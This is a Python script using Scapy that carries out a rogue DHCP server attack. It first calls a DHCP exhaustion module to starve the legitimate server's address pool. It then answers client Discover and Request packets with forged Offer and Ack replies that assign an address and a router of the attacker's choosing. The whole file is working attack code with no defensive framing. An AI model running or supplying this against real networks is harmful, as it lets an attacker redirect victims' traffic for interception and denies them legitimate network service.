#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, UDP, BOOTP, DHCP
import dhcp_exhaust
source_interface = "Ethernet"

# EXHAUST IP POOL OF REAL DHCP
dhcp_exhaust.exhaust()
print("exhaust finished SNIFFING")

i = 0

def process(p):
    global i
    i+= 1
    print("."*i + "\r", end="")
    if p.haslayer('DHCP'):
        i = 0
        chaddr = p["BOOTP"].chaddr
        xid = p["BOOTP"].xid
        if p["DHCP"].options[0][1] == 1:
            print("Discover received")
            dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") \
                        / IP(src='10.10.1.1', dst='255.255.255.255') \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=2, yiaddr="10.10.1.2", siaddr="10.10.1.1", chaddr=chaddr, xid=xid) \
                        / DHCP(options=[('message-type', 'offer'),("server_id", "10.10.1.1"), ("broadcast_address", "10.10.1.255"),\
                        ("router", "10.10.1.254"), ("subnet_mask", "255.255.255.0"), ('end')])
            sendp(dhcp_offer, iface=source_interface, verbose=0)
            print( " -> Offer sent")
        elif p["DHCP"].options[0][1] == 3:
            print("Request received")
            dhcp_ack = Ether(dst="ff:ff:ff:ff:ff:ff") \
                        / IP(src='10.10.1.1', dst='10.10.1.2') \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=2, yiaddr="10.10.1.2", siaddr="10.10.1.1", chaddr=chaddr, xid=xid) \
                        / DHCP(options=[('message-type', 'ack'),("server_id", "10.10.1.1"), ("broadcast_address", "10.10.1.255"),\
                        ("router", "10.10.1.254"), ("subnet_mask", "255.255.255.0"), ('end')])
            sendp(dhcp_ack, iface=source_interface, verbose=0)
            print( " -> Ack sent")


# DHCP SERVEUR SIMULATION
print("SNIFFING")
offer = sniff(filter="src host 0.0.0.0 and port 68 and port 67", iface=source_interface, prn=process)